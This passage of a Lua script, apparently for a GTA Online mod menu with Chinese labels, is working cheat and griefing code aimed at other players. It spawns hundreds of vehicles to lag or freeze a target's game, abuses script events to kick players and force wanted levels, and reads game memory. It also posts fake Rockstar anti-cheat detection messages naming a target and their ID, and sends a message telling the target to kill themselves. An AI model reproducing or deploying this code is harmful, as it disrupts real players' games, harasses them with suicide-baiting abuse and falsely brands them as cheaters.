            ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 0.0, -0.20, 2, 1.0, 1.0,1, true, true, true, false, 0, true)
        else
            ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
        end
    end)
    diaozhen = menu.list(jindianegao, "掉帧", {}, "", function(); end)
    menu.action(diaozhen, "掉帧v1", {""}, "", function()
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)  
        for i = 0, 180 do 
            attachmentveh1 = CreateVehicle(353883353,TargetPlayerPos,0)   
    end
end)

    Ptools_PanTable = {}
    Ptools_PanCount = 1
    Ptools_FishPan = 20

    menu.action(diaozhen, "掉帧v2", {"pan"}, "", function ()
        local targetped = getPlayerPed(pid)
        local targetcoords = getEntityCoords(targetped)

        local hash = util.joaat("tug")
        requestModel(hash)
        while not hasModelLoaded(hash) do wait() end

        for i = 1, Ptools_FishPan do
            Ptools_PanTable[Ptools_PanCount] = VEHICLE.CREATE_VEHICLE(hash, targetcoords.x, targetcoords.y, targetcoords.z, 0, true, true, true)
            ----
            local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Ptools_PanTable[Ptools_PanCount])
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Ptools_PanTable[Ptools_PanCount])
            NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, pid, true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Ptools_PanTable[Ptools_PanCount], true, false)
            ENTITY.SET_ENTITY_VISIBLE(Ptools_PanTable[Ptools_PanCount], false, 0)
            ----
            if SE_Notifications then
                util.toast("使用的索引生成 " .. Ptools_PanCount)
            end
            Ptools_PanCount = Ptools_PanCount + 1
        end
    end)

	menu.action(diaozhen,"掉帧v3", {}, "", function() -- cpu burn simulator v2
		while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			util.yield(10)
		end
		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) --save location
		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)

		notification("开始变得迟钝", colors.pink)
		menu.trigger_commands("anticrashcamera on")
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 300
		while spam_amount >= 1 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 1
			util.yield(10)
		end
		notification("卡死", colors.pink) -- cpu burned congrats
		menu.trigger_commands("anticrashcamera off")
	end)

    menu.action(jindianegao, "移除掉帧", {"rmpan"}, "", function ()
        for x = 1, 5, 1 do
            for i = 1, #Ptools_PanTable do
                entities.delete_by_handle(Ptools_PanTable[i])
                wait(10)
            end
        end
        --
        Ptools_PanCount = 1
        Ptools_PanTable = {}
        noNeedModel(util.joaat("tug"))
    end)

menu.action(jindianegao, "喷射", {"peeloop"}, "", function(state)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local bone_index = PED.GET_PED_BONE_INDEX(player_ped, 0x2e28)
    request_ptfx_asset_peeloop("core_snow")
    GRAPHICS.USE_PARTICLE_FX_ASSET("core_snow")
    ptfx_id = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(
        "cs_mich1_spade_dirt_throw", player_ped, 0, 0, 0, -90, 0, 0, bone_index, 2, false, false, false
    ) 
end)


    menu.click_slider(jindianegao, "给予通缉等级", {}, "", 1, 5, 5, 1, function(val)
        local playerInfo = memory.read_long(entities.handle_to_pointer(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) + 0x10C8)
        while memory.read_uint(playerInfo + 0x0888) < val do
            for i = 1, 46 do
                PLAYER.REPORT_CRIME(pid, i, val)
            end
            util.yield(75)
        end
    end)

    menu.action(jindianegao, "在玩家面前生成隐形坡道", {}, "", function() 
        local ramp_hash = util.joaat("stt_prop_ramp_jump_l")
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player, 0, 10, -2)
        local rot = ENTITY.GET_ENTITY_ROTATION(player, 2)
        request_model(ramp_hash)
    
        local ramp = OBJECT.CREATE_OBJECT(ramp_hash, pos.x, pos.y, pos.z, true, false, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ramp)
    
        ENTITY.SET_ENTITY_VISIBLE(ramp, false)
        ENTITY.SET_ENTITY_ROTATION(ramp, rot.x, rot.y, rot.z + 90, 0, true)
        util.yield(1000)
        entities.delete_by_handle(ramp)
    end)

    menu.action(jindianegao, "核弹", {""}, "", function(on_click)
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local Object_pizza1 = CreateVehicle(1131912276,TargetPlayerPos,0)
        local Object_pizza2 =CreateObject(253279588,TargetPlayerPos)
            TargetPlayerPos.y = TargetPlayerPos.y + 2
            TargetPlayerPos.z = TargetPlayerPos.z + 70 
            ENTITY.SET_ENTITY_ALPHA(Object_pizza1, 255)
            ENTITY.SET_ENTITY_VISIBLE(Object_pizza1, false, 0)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(Object_pizza2,Object_pizza1, 0,  0.0, 0.00, 0.00, 1.0, 1.0,1, true, false, true, false, 0, true)
        util.yield(5000)
        do
        orbital(pid)
        entities.delete_by_handle(Object_pizza1)
        entities.delete_by_handle(Object_pizza2)
      end
end)

menu.toggle_loop(jindianegao, '实体风暴', {'entityStorm'}, '超时他', function ()
    chaoshita(pid) 
end)

menu.action(jindianegao, "生成小查攻击", {}, "", function()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(p, 0.0, -1.0, 0.0)
    local objHash = util.joaat("A_C_Chop")
    requestModels(objHash)
    local g_ped = PED.CREATE_PED(PED_TYPE_CIVMALE, objHash, coords.x, coords.y, coords.z, 0, true, false)

    ENTITY.SET_ENTITY_HEADING(g_ped, ENTITY.GET_ENTITY_HEADING(p))
    PED.SET_PED_MONEY(g_ped, 2000)
    PED.SET_PED_MAX_HEALTH(g_ped, 10000)
    ENTITY.SET_ENTITY_HEALTH(g_ped, 10000)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(g_ped, true)
    TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(g_ped, true)
    TASK.TASK_COMBAT_PED(g_ped, p, 0, 16)
    PED.SET_PED_COMBAT_ATTRIBUTES(g_ped, 46, 1)
    PED.SET_PED_AS_ENEMY(g_ped, true)

    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(objHash)
end)

menu.action(jindianegao, "杀死室内玩家", {}, "若此玩家在公寓则无法使用", function()
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(player)

    util.trigger_script_event(1 << pid, {-1428749433, pid, 448051697, math.random(0, 9999)})
    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 1000, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
end)

    menu.action(jindianegao,  "踢出室内", {}, "强制将玩家踢出室内\n身处的大部分室内都可以踢\n部分室内无法踢出.", function() -- very innovative!
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local glitch_hash = util.joaat("p_spinning_anus_s")
        local poopy_butt = util.joaat("brickade2")
        request_model(glitch_hash)
        request_model(poopy_butt)
        for i, interior in ipairs(interior_stuff) do
            if get_interior_player_is_in(pid) == interior then
                util.toast("玩家不在室内. :/")
            return end
        end
        for i = 1, 5 do
            local stupid_object = entities.create_object(glitch_hash, pos)
            local glitch_vehicle = entities.create_vehicle(poopy_butt, pos, 0)
            ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
            ENTITY.SET_ENTITY_VISIBLE(glitch_vehicle, false)
            ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
            ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(glitch_vehicle, 1, 0.0, 10, 10, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            util.yield(500)
            entities.delete_by_handle(stupid_object)
            entities.delete_by_handle(glitch_vehicle)
            util.yield(500)     
        end
    end)
	
    menu.action(jindianegao, "禁用投掷物", {}, "禁止该玩家使用投掷物.", function(toggle) 
        local baseball = util.joaat("weapon_ball")
        request_model(baseball)
        local id = PLAYER.PLAYER_PED_ID()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))

        for i = 1, 60 do
            WEAPON.GIVE_WEAPON_TO_PED(id, baseball, 1, false, false)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z + 5, 0, true, util.joaat("WEAPON_BALL"), PLAYER.PLAYER_PED_ID(), false, true, 0, ped, 0)
        end
        util.yield(500)
        MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 400, 0)
    end)

    menu.action(jindianegao, "送进监狱", {}, "将此玩家传送到博林布鲁克监狱", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local my_ped = PLAYER.GET_PLAYER_PED(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 1628.5234, 2570.5613, 45.56485, true, false, false, false)
        menu.trigger_commands("givesh " .. players.get_name(pid))
        menu.trigger_commands("summon " .. players.get_name(pid))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")
        util.yield(5000)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z)
    end)

    menu.toggle_loop(jindianegao, "传送所有PED给玩家", {"toggletppeds"}, "", function (on_toggle)
            if on_toggle then
                TpAllPeds(pid)
            else
                TpAllPeds(pid)
            end
    end)

    menu.toggle_loop(jindianegao, "传送所有载具给玩家", {"toggletppedstpvehs"}, "", function (on_toggle)
            if on_toggle then
                TpAllVehs(pid)
            else
                TpAllVehs(pid)
            end
    end)

    menu.toggle_loop(jindianegao, "传送所有物体给玩家", {"tpobjs"}, "", function (on_toggle)
            if on_toggle then
                TpAllObjects(pid)
            else
                TpAllObjects(pid)
            end
    end)

    menu.toggle_loop(jindianegao, "传送所有拾取物给玩家", {"tppickups"}, "", function (on_toggle)
            if on_toggle then
                TpAllPickups(pid)
            else
                TpAllPickups(pid)
            end
    end)

    menu.toggle_loop(jindianegao, "假钱雨", {}, "", function ()
        local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
        Streamptfx('core')
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD( 'ent_brk_banknotes', tar1.x, tar1.y, tar1.z + 1, 0, 0, 0, 3.0, true, true, true)
    end)

            rain_root = menu.list(jindianegao, '实体雨', {''}, '')

            function rain(pid, entity)
                local pos = players.get_position(pid)
                local hash = util.joaat(entity)
                pos.x += math.random(-30,30)
                pos.y += math.random(-30,30)
                pos.z += 30
                loadModel(hash)
                local animal = entities.create_ped(28, hash, pos, 0)
                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
                ENTITY.SET_ENTITY_INVINCIBLE(animal, true)
                return animal
            end

            rainOptions = {
                { name = '喵喵雨',    description = 'UWU',                                          animals = {'a_c_cat_01'},                                 spawned = {} },
                { name = '海豚雨',     description = '<º)))><',                                      animals = {'a_c_fish', 'a_c_dolphin', 'a_c_killerwhale','a_c_killerwhale'}, spawned = {} },
                { name = '汪汪雨',     description = '呜呜',                                        animals = {'a_c_retriever', 'a_c_pug', 'a_c_rottweiler'}, spawned = {} },
                { name = 'ikun雨', description = '*咯咯叫*',                                   animals = {'a_c_hen'},                                    spawned = {} },
                { name = '猴子雨',  description = '我知道猴子会发出什么声音',                 animals = {'a_c_chimp'},                                  spawned = {} },
                { name = '猪猪雨',     description = '(> (00) <)',                                   animals = {'a_c_pig'},                                    spawned = {} },
                { name = '鼠鼠雨',     description = '在你的电脑上安装远程访问木马', animals = {'a_c_rat'},                                    spawned = {} },
                { name = '野猪雨',     description = '你是头猪', animals = {'a_c_boar'},                                    spawned = {} },
                { name = '牛牛雨',     description = '你是头牛', animals = {'a_c_cow'},                                    spawned = {} },
                { name = '鹿鹿雨',     description = '你是头鹿', animals = {'a_c_deer'},                                    spawned = {} },
                { name = 'NPC雨',     description = '在玩家透视掉落NPC', animals = {'s_m_y_xmech_02'},                                    spawned = {} },
            }
            for i = 1, #rainOptions do
                menu.toggle_loop(rain_root, rainOptions[i].name, {''.. rainOptions[i].name}, rainOptions[i].description, function()
                    for _, animal in pairs(rainOptions[i].animals) do
                        rainOptions[i].spawned[#rainOptions[i].spawned + 1] = rain(pid, animal)
                        util.yield(500)
                    end
                    if not players.exists(pid) then util.stop_thread() end
                end, function()
                    for j, spawned in ipairs(rainOptions[i].spawned) do
                        entities.delete_by_handle(spawned)
                        rainOptions[i].spawned[j] = nil
                    end
                end)
            end

    menu.toggle_loop(jindianegao, "附近NPC跳伞", {"skydivepeds"}, "", function()
        if players.exists(pid) then
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
                all_peds = entities.get_all_peds_as_handles()
                player_ped = PLAYER.PLAYER_PED_ID()
                for k,ped in pairs(all_peds) do
                    if not PED.IS_PED_A_PLAYER(ped) then
                        TASK.TASK_SKY_DIVE(ped)
                    end
            end
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(jindianegao, "CEO踢出", {}, "", function()
        for i = 1, 200 do
            util.trigger_script_event(1 << pid, {-1831959078, pid, 1, 0, 2, 0, 3, 5})
        end
    end)

    menu.action(jindianegao, "禁止CEO", {}, "", function()
        for i = 1, 200 do
            util.trigger_script_event(1 << pid, {316066012, pid, 1, 0, 2, 1})
        end
    end)

    menu.action(jindianegao, "关门放狗", {""}, "", function(on_click)
        sendog(pid)
    end)

	menu.action(jindianegao, "掉猴子", {""}, "", function()
        sendmonkey(pid)
    end)
        menu.action(jindianegao, "掉CXK", {""}, "", function()
        sendcxk(pid)
    end)

    local friendly = menu.list(playerMain, "友好选项", {}, "")
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

        local chattrolls_root = menu.list(friendly, "虚假检测", {}, "")

    menu.action(chattrolls_root, "虚假RAC检测聊天", {}, "用户触发检测：Rockstar反作弊 (C1)", function(click_type)
        local types = {'I3', 'C1', 'C2', 'C3', 'C4', 'C5', 'D1', 'D2', 'D3', 'D4', 'D5', 'E1', 'E2', 'I2', 'I1'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：Rockstar反作弊 (" .. det_type .. ")".. "RID:" ..players.get_rockstar_id(pid), false, true, true)
    end)

    menu.action(chattrolls_root, "虚假XIPRO检测聊天", {}, "用户触发XIPRO检测：Rockstar反作弊 (C1)", function(click_type)
        local types = {'I3', 'C1', 'C2', 'C3', 'C4', 'C5', 'D1', 'D2', 'D3', 'D4', 'D5', 'E1', 'E2', 'I2', 'I1'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：Rockstar反作弊 (" .. det_type .. ") ----¦XIPRO""\nRID:" ..players.get_rockstar_id(pid), false, true, true)
    end)

    menu.action(chattrolls_root, "虚假2take1检测聊天", {}, "用户触发2take1检测：Rockstar反作弊 (C1)""\nRID:" ..players.get_rockstar_id(pid), function(click_type)
        local types = {'I3', 'C1', 'C2', 'C3', 'C4', 'C5', 'D1', 'D2', 'D3', 'D4', 'D5', 'E1', 'E2', 'I2', 'I1'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：Rockstar反作弊 (" .. det_type .. ") ----¦2take1""\nRID:" ..players.get_rockstar_id(pid), false, true, true)
    end)

    menu.action(chattrolls_root, "虚假XIPRO检测分离踢", {}, "用户触发XIPRO检测：分离踢""\nRID:" ..players.get_rockstar_id(pid), function(click_type)
        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：分离踢 ----¦XIPRO""\nRID:" ..players.get_rockstar_id(pid), false, true, true)
    end)

    menu.action(chattrolls_root, "虚假2take1检测分离踢", {}, "用户触发2take1检测：分离踢""\nRID::" ..players.get_rockstar_id(pid), function(click_type)
        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：分离踢 ----¦2take1""\nRID:" ..players.get_rockstar_id(pid), false, true, true)
    end)

    menu.action(chattrolls_root, "虚假XIPRO检测崩溃", {}, "用户触发XIPRO检测：不同的崩溃", function(click_type)
        local types = {'碎片崩溃v1', '碎片崩溃v2', '碎片崩溃v3', '无效载具崩溃', '无效模型崩溃', '悲伤的耶稣崩溃', '脚本事件崩溃v1', '脚本事件崩溃v2', '泡泡糖崩溃', '绿玩保护崩溃', '无效模型崩溃', '莱纳斯崩溃', '董哥崩溃', '美杜莎崩溃', '马桶崩溃'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：" .. det_type .. " ----¦XIPRO""\nRID:" ..players.get_rockstar_id(pid), false, true, true)
    end)

    menu.action(chattrolls_root, "虚假2take1检测崩溃", {}, "用户触发2take1检测：不同的崩溃", function(click_type)
        local types = {'碎片崩溃v1', '碎片崩溃v2', '碎片崩溃v3', '无效载具崩溃', '无效模型崩溃', '悲伤的耶稣崩溃', '脚本事件崩溃v1', '脚本事件崩溃v2', '泡泡糖崩溃', '绿玩保护崩溃', '无效模型崩溃', '莱纳斯崩溃', '董哥崩溃', '美杜莎崩溃', '马桶崩溃'}
        local det_type = types[math.random(1, #types)]
        chat.send_message('> ' .. players.get_name(pid) .. " 触发了检测：" .. det_type .. " ----¦2take1""\nRID:" ..players.get_rockstar_id(pid), false, true, true)
    end)

menu.toggle_loop(friendly, "高额存款", {}, "检测超过6亿存款的玩家", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        if players.get_money(pid) > 600000000 then 
            util.draw_debug_text(players.get_name(pid) .. " 有不正常存款")
            if kickHighMoney then 
                menu.trigger_commands("kick".. players.get_name(pid))
                util.toast(players.get_name(pid).. " 因为高额存款而被踢。")
            end
        end
    end
end)

menu.toggle(friendly, "踢出拥有高额存款的玩家", {}, "必须启用高额存款检测.", function(toggle)
    kickHighMoney = toggle
end)

menu.toggle_loop(friendly, "过高等级", {}, "检测等级超过4000的玩家", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        if players.get_rank(pid) > 4000 then 
            util.draw_debug_text(players.get_name(pid) .. " 有不正常等级")
            if kickHighLevel then 
                menu.trigger_commands("kick".. players.get_name(pid))
                util.toast(players.get_name(pid).. " 因为等级过高被踢。")
            end 
        end
    end
end)

menu.toggle(friendly, "踢出等级过高的玩家", {}, "必须启用过高等级检测.", function(toggle)
    kickHighLevel = toggle
end)

menu.toggle_loop(friendly, "语音聊天", {}, "通知您有人使用语音聊天，这不是一个很好的检测。", function()
    for _, pid in ipairs(players.list(true, true, true)) do
        if NETWORK.NETWORK_IS_PLAYER_TALKING(pid) then 
            util.toast(players.get_name(pid) " is using voice-chat")
        end
    end
end)

menu.toggle_loop(friendly, "法语", {}, "如果发现法国人，会通知你", function()
    for _, pid in ipairs(players.list(true, true, true)) do
        if players.get_language(pid) == 1 then
            util.toast(players.get_name(pid).. " is French!")
        end
    end
end)

    menu.action(friendly, "获取账户信息", {}, "获取玩家的帐户信息，格式：电子邮件：密码", function()
        util.toast("你他妈还指望什么呢，混蛋！")
    end)

    menu.action(friendly, "宣布傻子等级", {}, "", function()
    local basedLevel = math.random(100)
    local basedPercentage = players.get_name(pid).. " 是 ".. basedLevel.. "% 傻子"
    chat.send_message(basedPercentage, false, true, true)
    end)

    menu.action(friendly, "告诉他们自杀", {}, "观点: 迷失了方向", function() 
    local kys = "傻子 " .. players.get_name(pid) .. ' 你应该现在就自杀！' 
    chat.send_message(kys, false, true, true)
    end)

    local halloween_loop = menu.list(friendly, "循环给予万圣节收藏品", {}, "")
    local halloween_delay = 500
    menu.slider(halloween_loop, "延迟", {}, "", 0, 2500, 500, 10, function(amount)
        halloween_delay = amount
    end)
    menu.toggle_loop(halloween_loop,"启用循环", {"halloween"}, "应该给他们不少钱和其他一些东西", function()
        util.trigger_script_event(1 << pid, {1839167950, pid, 8, -1, 1, 1, 1})
    end)

    local rp_loop = menu.list(friendly, "循环给予收藏品", {}, "")
    local delay = 500
    menu.slider(rp_loop, "延迟", {}, "", 0, 2500, 500, 10, function(amount)
        delay = amount
    end)

    menu.toggle_loop(rp_loop, "启用循环", {"Collection"}, "每个收藏品会给玩家1000RP经验", function()
        util.trigger_script_event(1 << pid, {1839167950, pid, 4, -1, 1, 1, 1})
        util.yield(delay)
    end)

    local spec = menu.ref_by_rel_path(menu.player_root(pid), "Spectate")
    local spec_root = menu.list(spec, "智能方法")
    local smart_spec
    smart_spec = menu.toggle_loop(friendly, "智能观看", {"smartspectate"}, "启动后会自动决定使用那种观看方法.", function()
        if not players.exists(pid) then util.stop_thread() end

        local ninja_spec = menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Ninja Method")
        local legit_spec = menu.ref_by_rel_path(menu.player_root(pid), "Spectate>Legit Method")

        if legit_spec.value == false and ninja_spec.value == false and smart_spec.value == true then
            if get_interior_player_is_in(pid) == 0 then
                legit_spec.value = false
                ninja_spec.value = true
            else
                ninja_spec.value = false
                legit_spec.value = true
            end 
            util.yield(1000)
            if legit_spec.value == false and ninja_spec.value == false then
                smart_spec.value = false
            end
        end

    end, function()
        menu.trigger_commands("stopspectating")
    end)

    local esp_tgl
    esp_tgl = menu.toggle(friendly, "启动透视", {""}, "", function(toggled)
        if toggled then
            while toggled do
                if smart_spec.value == false then
                    util.toast("请开启智能观看功能. :/")
                    esp_tgl.value = false
                return end
                util.yield()
            end
            menu.trigger_command(menu.ref_by_path("World>Inhabitants>Player ESP>Bone ESP>Low Latency Rendering"))
            menu.trigger_command(menu.ref_by_path("World>Inhabitants>Player ESP>Name ESP>Name ESP>Low Latency Rendering"))
            menu.trigger_commands("esptags off")
        else
            menu.trigger_command(menu.ref_by_path("World>Inhabitants>Player ESP>Bone ESP>Disabled"))
            menu.trigger_command(menu.ref_by_path("World>Inhabitants>Player ESP>Name ESP>Name ESP>Disabled"))
        end
    end)

    menu.action(friendly, "给予升级", {}, "给予该玩家17万RP经验,可从1级提升至25级.", function()
        menu.trigger_commands("givecollectibles" .. players.get_name(pid))
    end)

menu.toggle_loop(friendly, "循环掉落收集品", {}, "对你附近的玩家也有效", function()
for _, aPed in ipairs(entities.get_all_peds_as_handles()) do
    local pedType = PED.GET_PED_TYPE(aPed)
    if pedType < 4 then
        local selfCoords = players.get_position(players.user())
        local coords = ENTITY.GET_ENTITY_COORDS(aPed, true)
        local figure = MISC.GET_HASH_KEY("vw_prop_vw_colle_prbubble")
        loadModel(figure)
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z+1.5, 0, 1, figure, false, true)
        util.yield(partyDropDelay)
    end
end
end)

    local dropCard = menu.list(friendly, "掉落扑克牌", {}, "")

    menu.slider(dropCard, "掉落延迟", {}, "", 100, 10000, 1500, 100, function(cardDelay)  
        cardDropDelay = cardDelay
    end)
    cardDropDelay = 1500

    menu.toggle_loop(dropCard, "启用", {}, "玩家每次只能获得54张牌", function()
        local coords = players.get_position(pid)
        coords.z = coords.z + 1.5
        local card = MISC.GET_HASH_KEY("vw_prop_vw_lux_card_01a")
        loadModel(card)
        OBJECT.CREATE_AMBIENT_PICKUP(-1009939663, coords.x, coords.y, coords.z, 0, 1, card, false, true)
        util.yield(cardDropDelay)
    end)

    menu.toggle_loop(friendly, "自动给予脚本主机", {}, "", function()
        while players.get_script_host() ~= pid do 
            menu.trigger_commands("givesh" .. players.get_name(pid))
            util.yield(10)
        end
        util.yield(500)
    end)

    menu.toggle_loop(friendly, "脚本主机赌博(俄罗斯轮盘)", {}, "可能会中断战局", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        menu.trigger_commands("givesh" .. players.get_name(pid))
        util.yield(1500)
    end
end)

    menu.action(friendly, "修理载具", {}, "修理玩家的载具，如果玩家不在载具中，它会修理玩家驾驶过的最后一辆载具", function()    
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerVehicle = PED.GET_VEHICLE_PED_IS_IN(player, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(playerVehicle)
        VEHICLE.SET_VEHICLE_FIXED(playerVehicle)
    end)

    menu.action(friendly, '极力保护', {'max'}, '一次性为该玩家提供自动恢复/给予所有武器/永不通缉的保护', function ()
        menu.trigger_commands("bail".. players.get_name(pid))
        menu.trigger_commands("autoheal".. players.get_name(pid))
        menu.trigger_commands("arm".. players.get_name(pid))
        menu.trigger_commands("givevehgodmode".. players.get_name(pid))
    end, nil, nil, COMMANDPERM_FRIENDLY)

    menu.action(friendly, "掉落医药包", {}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pId)
        local pos = ENTITY.GET_ENTITY_COORDS(p)
        local objHash = util.joaat("prop_ld_health_pack")
        requestModels(objHash)
        local pickupHash = 2406513688
        local pickup = OBJECT.CREATE_PICKUP(pickupHash, pos.x, pos.y + 1.0, pos.z, 1, 100, false, objHash)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(objHash)
    end)

    menu.action(friendly, "掉落护甲", {}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pId)
        local pos = ENTITY.GET_ENTITY_COORDS(p)
        local objHash = util.joaat("prop_armour_pickup")
        requestModels(objHash)
        local pickupHash = 1274757841
        local pickup = OBJECT.CREATE_PICKUP(pickupHash, pos.x, pos.y + 1.0, pos.z, 1, 100, false, objHash)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(objHash)
    end)

    menu.action(friendly, "横向加速带", {}, "", function() 
        local coords = players.get_position(pid)
        coords.z = coords.z - 0.2
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local heading = ENTITY.GET_ENTITY_HEADING(player)
        local heading = heading + 80
        local boostpad = entities.create_object(3287988974, coords)
        ENTITY.SET_ENTITY_HEADING(boostpad, heading)
    end)

    menu.action(friendly, "水平加速带", {}, "", function() 
        local coords = players.get_position(pid)
        coords.z = coords.z - 0.6
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local heading = ENTITY.GET_ENTITY_HEADING(player)
        local boostpad = entities.create_object(-388593496, coords)
        ENTITY.SET_ENTITY_HEADING(boostpad, heading)
    end)
    
    menu.toggle_loop(friendly, "喇叭加速", {}, "给予这个玩家喇叭加速", function()  
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(player, false)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
        local force = ENTITY.GET_ENTITY_FORWARD_VECTOR(vehicle)
        force.x = force.x * 20
        force.y = force.y * 20
        force.z = force.z * 20
        while PLAYER.IS_PLAYER_PRESSING_HORN(pid) == true do 
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle)
            ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, force.x, force.y, force.z, 0.0, 0.0, 0.0, 1, false, true, true, true, true)
            util.yield(100)
        end 
    end)

    local firw = {speed = 1000}
    menu.toggle_loop(friendly, '天女散花', {'firew'}, '给他秀一波', function ()
          local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
          local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
          local weap = util.joaat('weapon_firework')
          WEAPON.REQUEST_WEAPON_ASSET(weap)
          for y = 0, 1 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 4.0, tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(0, 15), 200, 0, weap, 0, false, false, firw.speed)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 4.0, tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(0, 15), 200, 0, weap, 0, false, false, firw.speed)
